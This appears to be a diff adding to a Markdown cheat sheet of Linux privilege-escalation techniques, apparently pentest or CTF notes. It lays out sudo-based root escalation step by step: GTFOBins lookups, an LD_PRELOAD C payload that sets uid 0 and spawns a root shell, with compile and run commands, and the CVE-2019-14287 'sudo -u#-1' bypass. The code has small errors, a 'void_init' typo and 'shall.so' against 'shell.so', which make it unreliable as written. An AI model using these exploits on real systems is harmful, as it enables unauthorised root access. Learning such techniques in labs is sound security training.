@@ -113,20 +113,66 @@ ssh -i id_rsa <user>@<ip>
 
 ## Escalation via Sudo
 ### Sudo Shell Escaping
-look for root NOPASSWORD
+1. Look for root NOPASSWORD
 ```bash
 sudo -l
 ```
-Check GTFOBins for the binary with sudo
+2. Check GTFOBins for the binary with sudo
 ```url
 https://gtfobins.github.io/
 ```
-Run the command found.
+3. Run the command found.
 
+### Intended Functionality
+1. check what you can run as root
+  ```bash 
+  sudo -l
+  ```
+2. Research GTFOBins for the binary
+3. If nothing is found search for <binary> root privilege escalation
+  
 ### LD_PRELOAD
+1. Identify LD_Preload with:
+  ```bash
+  sudo -l
+  ```
+2. Generate the following file: Shell.c
+  ```C
+  #include <stdio.h>
+  #include <sys/types.h>
+  #include <stdlib.h>
+  
+  void_init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+  }  
+  ```
+3. Compile the file:
+```bash
+gcc -fPIC -shared -o shall.so shell.c -nostartfiles
+```
+  
+4. Execute the attack
+```bash
+sudo LD_PRELOAD=<Path/to/>shell.so <binary we can run as sudo>
+```
+5. ROOT!
 
-
-
+### CVE-2019-14287
+  1. Run sudo -l
+  ```bash
+  sudo -l
+  ```
+  2. Check that you see: (ALL, !root) NOPASSWD: /bin/bash
+  3. Attempt the attack
+  ```bash
+  sudo -u#-1 /bin/bash
+  ```
+  4 ROOT!
+  
+## Escalation via SUID
 ## Escalation via Scheduled Tasks
 ### Check writeable Files and Directories
 ```bash
